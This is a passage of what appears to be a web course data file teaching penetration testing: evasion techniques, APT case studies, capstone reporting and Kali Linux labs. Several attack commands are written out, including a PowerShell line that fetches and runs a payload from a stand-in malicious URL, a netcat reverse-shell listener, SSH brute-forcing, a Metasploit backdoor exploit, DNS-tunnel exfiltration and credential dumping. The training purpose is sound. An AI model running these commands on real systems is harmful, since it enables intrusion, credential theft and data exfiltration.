                            <p class="pl-6 mb-4"><strong>3.1 Firewall Evasion</strong></p>
                            <p class="pl-6 mb-4">Firewalls monitor and block unauthorized traffic based on a set of rules. Attackers can bypass firewalls by using encrypted channels, manipulating protocols, or tunneling malicious traffic through legitimate services.</p>
                    
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Port Knocking:</strong> A stealthy method where attackers send packets to a series of predefined ports in sequence. When the correct "knock" sequence is detected, the firewall opens the port.</li>
                                <li><strong>Protocol Tunneling:</strong> Encapsulating malicious traffic inside legitimate protocols such as DNS or HTTPS to bypass firewall rules.
                                    <br><strong>Example:</strong> Using DNS tunneling to exfiltrate data.
                                    <br><code class="pl-6 mb-4">iodine -f dns_tunnel_domain.com</code>
                                </li>
                            </ul>
                    
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <p class="pl-6 mb-4"><strong>Bypass a Firewall Using DNS Tunneling:</strong></p>
                            <ol class="pl-6 mb-4">
                                <li>Set up a DNS tunneling tool like iodine to bypass a firewall.</li>
                                <li>Test data exfiltration by sending traffic over DNS through the firewall.</li>
                            </ol>
                        `},
                    {
                        title: 'Part :4 IDS/IPS Evasion',
                        content: `
                            <p class="pl-6 mb-4"><strong>3.2 IDS/IPS Evasion</strong></p>
                            <p class="pl-6 mb-4">IDS/IPS systems analyze network traffic for patterns associated with attacks. To bypass these systems, attackers often fragment their payloads, encrypt traffic, or blend malicious traffic with legitimate protocols.</p>
                    
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Fragmentation:</strong> Splitting malicious payloads across multiple small packets to avoid signature detection.
                                    <br><strong>Example:</strong> Fragmenting a large HTTP request to avoid IDS detection.
                                </li>
                                <li><strong>Encryption:</strong> Using encrypted channels (e.g., HTTPS, SSL/TLS) to mask the content of communications and evade detection.</li>
                                <li><strong>Anomalous Protocol Use:</strong> Using less-monitored or uncommon protocols to avoid detection by IDS/IPS systems.</li>
                            </ul>
                    
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <p class="pl-6 mb-4"><strong>Evade IDS/IPS:</strong></p>
                            <ol class="pl-6 mb-4">
                                <li>Use packet fragmentation to split a malicious payload across multiple packets and test whether it bypasses IDS/IPS detection.</li>
                                <li>Encrypt malicious traffic using OpenSSL to evade IDS detection.</li>
                            </ol>
                    
                            <p class="pl-6 mb-4"><strong>4. Real-World Case Studies of Evasion Techniques and Countermeasures</strong></p>
                    
                            <p class="pl-6 mb-4"><strong>Case Study 1: Operation Cobalt Kitty (2017)</strong></p>
                            <p class="pl-6 mb-4"><strong>Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>A state-sponsored APT group used fileless malware and advanced lateral movement techniques to evade detection during an extended campaign against financial and defense companies.</li>
                                <li>They used living off the land techniques such as PowerShell and WMI to perform malicious actions without dropping traditional malware on disk.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Evasion Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Fileless Malware:</strong> Malicious PowerShell scripts executed entirely in memory.</li>
                                <li><strong>Lateral Movement:</strong> Leveraging legitimate tools like PsExec and WMI to move laterally across the network.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Countermeasures:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Implemented PowerShell logging and behavioral detection to monitor for suspicious commands.</li>
                                <li>Hardened EDR systems to detect anomalous use of system tools like WMI and PsExec.</li>
                            </ul>
                        `},
            {
                        title: 'Case Study 2: FIN7 and Carbanak Group',
                        content: `
                            <p class="pl-6 mb-4"><strong>Case Study 2: FIN7 and Carbanak Group</strong></p>
                            <p class="pl-6 mb-4"><strong>Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>FIN7, an organized cybercriminal group, successfully bypassed security controls by using sophisticated phishing campaigns and code obfuscation techniques.</li>
                                <li>They deployed malware with encrypted payloads and used packers to evade AV detection.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Evasion Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Phishing:</strong> Spear-phishing campaigns used to deliver obfuscated malware payloads.</li>
                                <li><strong>Code Obfuscation:</strong> Custom malware and packers were used to hide the true functionality of the code.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Countermeasures:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Increased phishing awareness and employee training.</li>
                                <li>Implemented sandboxing and dynamic analysis tools to detect obfuscated code.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Case Study 3: APT28 (Fancy Bear)</strong></p>
                            <p class="pl-6 mb-4"><strong>Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>APT28, a well-known Russian cyber-espionage group, used DNS tunneling to exfiltrate data from compromised systems without triggering detection by traditional network security devices.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Evasion Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>DNS Tunneling:</strong> Covertly tunneled data through DNS requests, making it appear as normal DNS traffic.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Countermeasures:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Monitored DNS traffic for anomalies such as unusually large or frequent DNS queries.</li>
                                <li>Implemented DNS filtering and anomaly detection systems to detect and block tunneling attempts.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Assignment for Week 22:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Evasion Technique Lab:</strong> Simulate an attack using one or more evasion techniques (e.g., fileless malware, PowerShell obfuscation, DNS tunneling) and document how you bypassed security mechanisms such as AV, IDS, or firewalls.</li>
                                <li><strong>Case Study Report:</strong> Choose one real-world evasion case (e.g., Cobalt Kitty, FIN7, APT28) and analyze the techniques used by the attackers and the countermeasures implemented by the Blue Team.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Book:</strong> "The Hacker Playbook 3" by Peter Kim — A detailed guide to evasion techniques, red teaming, and advanced offensive security strategies.</li>
                                <li><strong>MITRE ATT&CK:</strong> Explore the Defense Evasion tactics (TA0005) in the MITRE ATT&CK framework to understand more about how attackers bypass security mechanisms.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Next Week Preview:</strong></p>
                            <p class="pl-6 mb-4">Next week, we will conclude the course with a Capstone Project that incorporates all of the skills and techniques learned throughout the program. You will conduct a comprehensive red team assessment and document the findings in a final report.</p>
                        `}
                    ],
                    videoUrl: '',
                    commands: [],
                    content: ''
                        
                },
                {   
                    id: "module-12",
                    title: 'Module 12 - Capstone Project and Certification Preparation ',
                    icon: Shield,
                    sections: [
                        {
                            title: 'Week 1: Capstone Project',
                            content: `
                                <p class="pl-6 mb-4"><strong>Part 1: Capstone Project</strong></p>
                                <p class="pl-6 mb-4">In this final module, you will apply everything you've learned throughout the course to complete a Comprehensive Penetration Test on a realistic enterprise environment. The capstone project involves performing a full-scale penetration test, documenting your findings, writing a professional penetration testing report, and presenting your results to a panel for review. This capstone will simulate real-world penetration testing scenarios to demonstrate your technical skills, problem-solving abilities, and professionalism.</p>
                    
                                <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Comprehensive penetration test on a realistic enterprise environment.</li>
                                    <li>Documenting findings and writing penetration testing reports.</li>
                                    <li>Presenting the capstone project to a panel for review.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>1. Comprehensive Penetration Test on a Realistic Enterprise Environment</strong></p>
                                <p class="pl-6 mb-4">This section will guide you through the steps necessary to conduct a full penetration test on a simulated enterprise network environment. You will need to perform reconnaissance, exploitation, post-exploitation, and reporting, adhering to best practices and professional standards for penetration testing.</p>
                    
                                <p class="pl-6 mb-4"><strong>1.1 Setting Up the Penetration Testing Environment</strong></p>
                                <p class="pl-6 mb-4">Before starting the capstone project, ensure that the test environment is properly configured. The simulated environment should include the following components:</p>
                    
                                <p class="pl-6 mb-4"><strong>1. Network Infrastructure</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Corporate Network Simulation:</strong> The network should include typical enterprise components such as internal servers (e.g., web servers, database servers), user workstations, and firewalls.</li>
                                    <li><strong>Cloud and On-Prem Components:</strong> Some resources may be hosted in the cloud (e.g., AWS, Azure), while others are on-premise to simulate a hybrid infrastructure.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>2. Services and Applications</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Web Applications:</strong> A vulnerable web application should be available for testing common web application attacks (e.g., SQL Injection, Cross-Site Scripting).</li>
                                    <li><strong>Authentication Mechanisms:</strong> Implement multi-factor authentication (MFA) and role-based access control (RBAC) to test authentication and privilege escalation attacks.</li>
                                    <li><strong>Databases:</strong> Simulated databases should hold sensitive data for exfiltration and privilege abuse testing.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>3. Active Directory (Optional)</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Active Directory:</strong> If applicable, simulate an Active Directory environment for conducting attacks like Kerberoasting, Pass-the-Hash, and Lateral Movement.</li>
                                </ul>
                            `},
                    {
                        title: 'Part 2: Phases of the Penetration Test',
                        content: `
                            <p class="pl-6 mb-4"><strong>1.2 Phases of the Penetration Test</strong></p>
                
                            <p class="pl-6 mb-4"><strong>1. Reconnaissance and Information Gathering</strong></p>
                            <p class="pl-6 mb-4">The first step is to gather information about the target environment.</p>
                
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Passive Reconnaissance:</strong> Use OSINT tools like theHarvester, Maltego, and Shodan to collect publicly available information about the organization.</li>
                                <li><strong>Active Scanning:</strong> Use Nmap for network discovery and service enumeration, and Nikto for web vulnerability scanning.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Tools:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Nmap:</strong> For port scanning, OS detection, and service enumeration.</li>
                                <li><strong>Recon-ng:</strong> For passive reconnaissance and OSINT data collection.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>2. Vulnerability Scanning</strong></p>
                            <p class="pl-6 mb-4">Once reconnaissance is complete, identify vulnerabilities in the target systems.</p>
                
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Automated Scanning:</strong> Use OpenVAS or Nessus to perform vulnerability scanning across the network.</li>
                                <li><strong>Manual Vulnerability Discovery:</strong> Check web applications for SQL injection, Cross-Site Scripting (XSS), and insecure authentication mechanisms.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Tools:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>OpenVAS:</strong> For general vulnerability scanning.</li>
                                <li><strong>Burp Suite:</strong> For web application security testing and manual vulnerability discovery.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>3. Exploitation</strong></p>
                            <p class="pl-6 mb-4">After identifying vulnerabilities, attempt to exploit them to gain initial access.</p>
                
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Web Application Exploitation:</strong> Exploit SQL injection, Cross-Site Scripting, or broken authentication in the web application.</li>
                                <li><strong>Network Exploitation:</strong> Use Metasploit to exploit misconfigurations or unpatched software vulnerabilities on the network.</li>
                                <li><strong>Password Cracking:</strong> Use John the Ripper or Hashcat to crack weak passwords and escalate privileges.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Tools:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Metasploit Framework:</strong> For exploiting network services.</li>
                                <li><strong>SQLMap:</strong> For automating SQL injection attacks.</li>
                                <li><strong>Hydra:</strong> For password brute-forcing against services like SSH or RDP.</li>
                            </ul>
                        `},
                    {
                        title: '4. Post-Exploitation',
                        content: `
                            <p class="pl-6 mb-4"><strong>4. Post-Exploitation</strong></p>
                            <p class="pl-6 mb-4">Once initial access is obtained, move to post-exploitation activities, such as lateral movement, privilege escalation, and data exfiltration.</p>
                            
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Privilege Escalation:</strong> Use Mimikatz to dump credentials or escalate privileges on compromised systems.</li>
                                <li><strong>Lateral Movement:</strong> Move across the network using PsExec or Pass-the-Hash.</li>
                                <li><strong>Data Exfiltration:</strong> Steal sensitive information (e.g., customer data, credentials) from databases or file shares and exfiltrate it stealthily.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Tools:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Mimikatz:</strong> For credential harvesting and privilege escalation.</li>
                                <li><strong>Cobalt Strike:</strong> For lateral movement and persistence.</li>
                                <li><strong>rclone:</strong> For data exfiltration via cloud storage services.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>5. Reporting and Remediation</strong></p>
                            <p class="pl-6 mb-4">After completing the technical steps of the penetration test, you need to compile the findings into a formal report.</p>
                            
                            <p class="pl-6 mb-4"><strong>2. Documenting Findings and Writing Penetration Testing Reports</strong></p>
                            <p class="pl-6 mb-4">A key deliverable in any penetration testing engagement is the final report. The report should clearly document the testing process, vulnerabilities found, exploitation steps, and recommendations for remediation. This document should be both technical and business-oriented, so that both security professionals and executives can understand the findings.</p>
                            
                            <p class="pl-6 mb-4"><strong>2.1 Structure of the Penetration Testing Report</strong></p>
                            
                            <p class="pl-6 mb-4"><strong>1. Executive Summary</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Provide a high-level overview of the engagement, including the scope, objectives, key findings, and overall security posture.</li>
                                <li>Summarize critical vulnerabilities, risks, and potential business impact.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>2. Scope and Methodology</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Define the scope of the engagement, including in-scope systems, services, and data.</li>
                                <li>Describe the testing methodology, including tools used, and the steps taken for reconnaissance, exploitation, and post-exploitation.</li>
                            </ul>
                        `},
                    {
                        title: '3. Technical Findings',
                        content: `
                            <p class="pl-6 mb-4"><strong>3. Technical Findings</strong></p>
                            <p class="pl-6 mb-4">• Vulnerability Descriptions: Provide detailed descriptions of each vulnerability discovered, including:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Vulnerability Name:</strong> e.g., SQL Injection, Weak Passwords, Insecure Configuration.</li>
                                <li><strong>Affected Systems:</strong> Identify the specific systems or applications affected.</li>
                                <li><strong>Risk Rating:</strong> Rate the severity of the vulnerability (e.g., Critical, High, Medium, Low).</li>
                                <li><strong>Proof of Exploitation:</strong> Show screenshots, payloads, or logs to demonstrate successful exploitation.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>4. Remediation Recommendations</strong></p>
                            <p class="pl-6 mb-4">• For each vulnerability, provide actionable recommendations on how to remediate the issue, such as applying patches, configuring firewalls, or improving password policies.</p>
                            <p class="pl-6 mb-4">• Suggest general security improvements, such as enforcing multi-factor authentication (MFA) or improving network segmentation.</p>
                
                            <p class="pl-6 mb-4"><strong>5. Appendices</strong></p>
                            <p class="pl-6 mb-4">• Include detailed logs, output from tools, and any supporting documentation (e.g., attack paths, network maps, screenshots).</p>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <p class="pl-6 mb-4">• Write a Penetration Testing Report:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Complete the penetration test on your simulated enterprise environment.</li>
                                <li>Document your findings and write a professional report following the structure outlined above.</li>
                                <li>Focus on clarity, accuracy, and actionable recommendations.</li>
                            </ul>
                        `},
                    {
                        title: 'Part 3: Presenting the Capstone Project to a Panel for Review',
                        content: `
                            <p class="pl-6 mb-4">Once your penetration testing report is complete, you will present your findings to a panel of instructors or peers. This presentation should cover the key aspects of your penetration test, demonstrate your understanding of the testing methodology, and showcase your ability to communicate technical information clearly.</p>
                            
                            <p class="pl-6 mb-4"><strong>3.1 Preparing for the Presentation</strong></p>
                
                            <p class="pl-6 mb-4"><strong>1. Summary of Key Findings</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Start with a concise summary of the most critical vulnerabilities you discovered and their potential impact on the organization.</li>
                                <li>Use visuals like network diagrams, screenshots, and charts to enhance your presentation.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>2. Walkthrough of Exploits</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Demonstrate how you exploited key vulnerabilities, showing screenshots or videos of successful attacks.</li>
                                <li>Explain the tools and techniques you used at each step of the penetration test.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>3. Remediation Discussion</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Conclude by discussing the steps that the organization should take to remediate the vulnerabilities and prevent future attacks.</li>
                                <li>Emphasize best practices such as regular patching, improved access controls, and continuous monitoring.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Capstone Presentation:</li>
                                <li>Prepare a 10-15 minute presentation that summarizes your penetration test and key findings.</li>
                                <li>Present your findings, exploitation steps, and remediation recommendations to a panel.</li>
                                <li>Be ready to answer questions about your testing process, the significance of the vulnerabilities found, and how they should be addressed.</li>
                            </ul>
                        `},
                    {
                        title: 'Assignment for Week 1',
                        content: `
                            <p class="pl-6 mb-4"><strong>• Capstone Project:</strong> Conduct a full penetration test on a simulated enterprise environment. Write a detailed penetration testing report and present your findings to a panel.</p>
                            <p class="pl-6 mb-4"><strong>• Report Writing:</strong> Focus on creating clear, concise, and actionable recommendations for the vulnerabilities discovered.</p>
                            <p class="pl-6 mb-4"><strong>• Capstone Presentation:</strong> Prepare a professional presentation summarizing your findings and deliver it to peers or instructors.</p>
                
                            <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                            <p class="pl-6 mb-4"><strong>• Book:</strong> "The Penetration Testing Execution Standard (PTES)" — A widely adopted guide for structuring and conducting penetration testing engagements.</p>
                            <p class="pl-6 mb-4"><strong>• OWASP Testing Guide:</strong> A detailed guide on testing web applications, with a focus on vulnerability identification and remediation.</p>
                        `},
                    {
                        title: 'Practical Session Development for a Comprehensive Cybersecurity and Ethical Hacking Course (Beginner to Advanced)',
                        content: `
                            <p class="pl-6 mb-4">This practical-focused course will guide students through hands-on labs and exercises using Kali Linux and other relevant platforms. The course will begin with basic concepts and gradually progress to advanced penetration testing techniques. All practical sessions will be designed to be real-world, hands-on labs, ensuring students build skills through actual exploitation, defense, and incident response exercises.</p>
                
                            <p class="pl-6 mb-4">Below is the practical session outline, along with the tools, systems, and platforms needed at each stage of the course.</p>
                
                            <p class="pl-6 mb-4"><strong>Beginner Level: Introduction to Cybersecurity and Ethical Hacking</strong></p>
                
                            <p class="pl-6 mb-4"><strong>Lab 1: Setting Up the Penetration Testing Lab (Kali Linux and Virtualization)</strong></p>
                            <p class="pl-6 mb-4"><strong>Objective:</strong> Set up a Kali Linux-based penetration testing environment to ensure students have the correct tools to proceed with practical labs.</p>
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">Kali Linux: Use as the primary operating system for attack and testing.</p>
                            <p class="pl-6 mb-4">VirtualBox / VMware: To create isolated virtual environments for vulnerable systems.</p>
                            <p class="pl-6 mb-4">Metasploitable 2/3: A vulnerable virtual machine for students to exploit.</p>
                            <p class="pl-6 mb-4">OWASP Juice Shop: A vulnerable web application designed for practicing web application attacks.</p>
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. Install Kali Linux on VirtualBox/VMware or as a standalone OS.</p>
                            <p class="pl-6 mb-4">2. Set up Metasploitable 2/3 on a virtual machine.</p>
                            <p class="pl-6 mb-4">3. Configure networking between the attacker machine (Kali) and the target (Metasploitable).</p>
                        `},
                    {
                        title: 'Lab 2: Introduction to Basic Linux Commands and Networking',
                        content: `
                            <p class="pl-6 mb-4">Objective: Familiarize students with basic Linux commands, file system navigation, and basic networking commands.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong> Kali Linux terminal.</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. Practice basic commands: ls, cd, pwd, mkdir, rm, cp, mv.</p>
                            <p class="pl-6 mb-4">2. Explore basic networking tools: ping, ifconfig, netstat, traceroute.</p>
                            <p class="pl-6 mb-4">3. Identify local and remote hosts with ping and nmap.</p>
                            
                            <h4 class="font-bold mb-4 text-xl">Lab 3: Basic Information Gathering (Reconnaissance)</h4>
                                <p class="pl-6 mb-4">Objective: Perform basic reconnaissance and information gathering using OSINT tools.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">Nmap: For network scanning and enumeration.</p>
                            <p class="pl-6 mb-4">theHarvester: For passive reconnaissance and gathering email and subdomain information.</p>
                            <p class="pl-6 mb-4">WHOIS, DNS Recon, and Dig: For domain information and DNS enumeration.</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. <strong>Nmap:</strong> Run a basic port scan on a target machine (Metasploitable).</p>
                            <pre class="pl-6 mb-4">nmap -sS -Pn <target_ip></pre>
                            <p class="pl-6 mb-4">2. <strong>theHarvester:</strong> Gather subdomains, emails, and other OSINT data for a target.</p>
                            <pre class="pl-6 mb-4">theHarvester -d example.com -b all</pre>
                            <p class="pl-6 mb-4">3. <strong>WHOIS and Dig:</strong> Query domain information and DNS records.</p>
                            <pre class="pl-6 mb-4">whois example.com</pre>
                            <pre class="pl-6 mb-4">dig example.com any</pre>
                        `},
                    {
                        title: 'Lab 4: Scanning and Exploitation of Web Applications',
                        content: `
                            <p class="pl-6 mb-4">Objective: Perform vulnerability scanning and exploit web vulnerabilities like SQL Injection, Cross-Site Scripting (XSS), and CSRF.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">OWASP Juice Shop: A vulnerable web application.</p>
                            <p class="pl-6 mb-4">Burp Suite: For intercepting and manipulating web traffic.</p>
                            <p class="pl-6 mb-4">SQLMap: For automating SQL Injection attacks.</p>
                            <p class="pl-6 mb-4">Nikto: For basic web vulnerability scanning.</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. <strong>Nikto:</strong> Run a basic web vulnerability scan.</p>
                            <pre class="pl-6 mb-4">nikto -h http://target_ip</pre>
                            <p class="pl-6 mb-4">2. <strong>Burp Suite:</strong> Intercept web traffic and identify parameters vulnerable to SQL injection.</p>
                            <p class="pl-6 mb-4">3. <strong>SQLMap:</strong> Automate SQL Injection on the vulnerable input.</p>
                            <pre class="pl-6 mb-4">sqlmap -u "http://target_ip/vulnerable_page.php?id=1" --dbs</pre>

                            <h4 class="font-bold text-xl">Lab 5: Exploiting Network Vulnerabilities</h4>
                            <p class="pl-6 mb-4">Objective: Perform network exploitation, including exploitation of weak passwords, misconfigurations, and vulnerabilities in network services.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">Metasploit Framework: For exploiting vulnerabilities.</p>
                            <p class="pl-6 mb-4">Hydra: For brute-force password attacks.</p>
                            <p class="pl-6 mb-4">Netcat: For manual exploitation and reverse shell connections.</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. <strong>Hydra:</strong> Perform a password brute-force attack on SSH.</p>
                            <pre class="pl-6 mb-4">hydra -l root -P /path/to/wordlist.txt ssh://<target_ip></pre>
                            <p class="pl-6 mb-4">2. <strong>Metasploit:</strong> Exploit a known vulnerability (e.g., VSFTPD backdoor on Metasploitable).</p>
                            <pre class="pl-6 mb-4">use exploit/unix/ftp/vsftpd_234_backdoor set RHOST <target_ip> run</pre>
                            <p class="pl-6 mb-4">3. Use Netcat to establish a reverse shell from the target back to Kali Linux.</p>
                            <pre class="pl-6 mb-4">nc -lvnp 4444</pre>
                        `},
                    {
                        title: 'Lab 6: Vulnerability Scanning with OpenVAS',
                        content: `
                            <p class="pl-6 mb-4">Objective: Use OpenVAS to scan a network for vulnerabilities and identify potential weaknesses.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">OpenVAS (pre-installed in Kali Linux).</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. Configure OpenVAS and run a full vulnerability scan on the target network.</p>
                            <p class="pl-6 mb-4">2. Analyze the scan results and identify high-risk vulnerabilities.</p>
                            <p class="pl-6 mb-4">3. Use Metasploit to exploit the identified vulnerabilities.</p>

                            <h4 class="font-bold text-xl mb-4">Lab 7: Privilege Escalation on Windows and Linux</h4>
                            <p class="pl-6 mb-4">Objective: Escalate privileges on both Windows and Linux systems using common techniques.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">Metasploit: For post-exploitation modules.</p>
                            <p class="pl-6 mb-4">LinPEAS / WinPEAS: For privilege escalation enumeration.</p>
                            <p class="pl-6 mb-4">Mimikatz: For credential dumping on Windows.</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. <strong>Linux Privilege Escalation:</strong></p>
                            <p class="pl-6 mb-4">• Use LinPEAS to scan for privilege escalation opportunities on a Linux target.</p>
                            <pre class="pl-6 mb-4">./linpeas.sh</pre>
                            <p class="pl-6 mb-4">• Exploit weak sudo permissions or SUID binaries.</p>
                
                            <p class="pl-6 mb-4">2. <strong>Windows Privilege Escalation:</strong></p>
                            <p class="pl-6 mb-4">• Run WinPEAS to find misconfigurations.</p>
                            <pre class="pl-6 mb-4">winpeas.exe</pre>
                            <p class="pl-6 mb-4">• Use Mimikatz to dump Windows credentials.</p>
                            <pre class="pl-6 mb-4">mimikatz.exe</pre>
                        `},
                    {
                        title: 'Lab 8: Lateral Movement and Persistence',
                        content: `
                            <p class="pl-6 mb-4">Objective: Simulate lateral movement across a network and maintain persistence in compromised systems.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">PsExec: For lateral movement in Windows environments.</p>
                            <p class="pl-6 mb-4">SSH: For lateral movement on Linux.</p>
                            <p class="pl-6 mb-4">Cobalt Strike / Metasploit: For persistence.</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. <strong>Windows Lateral Movement:</strong> Use PsExec to move from one Windows machine to another using compromised credentials.</p>
                            <pre class="pl-6 mb-4">psexec \\<target_ip> -u <username> -p <password> cmd.exe</pre>
                
                            <p class="pl-6 mb-4">2. <strong>SSH:</strong> Use the SSH key from a compromised machine to move laterally across Linux servers.</p>
                            <pre class="pl-6 mb-4">ssh user@target_ip</pre>
                
                            <p class="pl-6 mb-4">3. Set up persistence with Metasploit using scheduled tasks or registry modifications.</p>
                        `},
                    {
                        title: 'Lab 9: Bypassing Antivirus and Endpoint Detection Systems',
                        content: `
                            <p class="pl-6 mb-4">Objective: Bypass antivirus (AV) and endpoint detection systems using fileless techniques and obfuscation.</p>
                
                            <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                            <p class="pl-6 mb-4">Veil-Evasion: For AV evasion.</p>
                            <p class="pl-6 mb-4">PowerShell: For fileless attacks.</p>
                            <p class="pl-6 mb-4">Cobalt Strike: For advanced evasion.</p>
                
                            <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                            <p class="pl-6 mb-4">1. Use Veil-Evasion to generate a payload that bypasses antivirus.</p>
                            <pre class="pl-6 mb-4">veil</pre>
                
                            <p class="pl-6 mb-4">2. Use PowerShell to execute a fileless attack by running a script directly in memory.</p>
                            <pre class="pl-6">powershell -exec bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).</pre>
                            <pre class="pl-6 mb-4">DownloadString('http://malicious_url/payload.ps1')" </pre>
                
                            <p class="pl-6 mb-4">3. Use Cobalt Strike's advanced evasion features to maintain persistence and evade detection.</p>
                        `},
                        {
                            title: 'Lab 10: Advanced Persistent Threat (APT) Simulation',
                            content: `
                                <p class="pl-6 mb-4">Objective: Simulate an APT attack, from initial compromise to data exfiltration.</p>
                    
                                <p class="pl-6 mb-4"><strong>• Tools:</strong></p>
                                <p class="pl-6 mb-4">Cobalt Strike: For APT simulation.</p>
                                <p class="pl-6 mb-4">Mimikatz: For credential dumping.</p>
                                <p class="pl-6 mb-4">Rclone: For data exfiltration to cloud services.</p>
                    
                                <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                                <p class="pl-6 mb-4">1. Gain initial access through phishing or social engineering techniques.</p>
                                <p class="pl-6 mb-4">2. Dump credentials using Mimikatz and move laterally through the network.</p>
                                <p class="pl-6 mb-4">3. Use Rclone to exfiltrate data to a cloud service like Google Drive or Dropbox.</p>
                            `},
                    {
                        title: 'Tools, Systems, and Platforms Needed',
                        content: `
                            <p class="pl-6 mb-4"><strong>Tools:</strong></p>
                            <p class="pl-6 mb-4">Kali Linux: The primary platform for the course.</p>
                            <p class="pl-6 mb-4">Nmap, Metasploit, Burp Suite, Hydra, SQLMap, OpenVAS, Nikto, Veil-Evasion, Cobalt Strike, Mimikatz.</p>
                
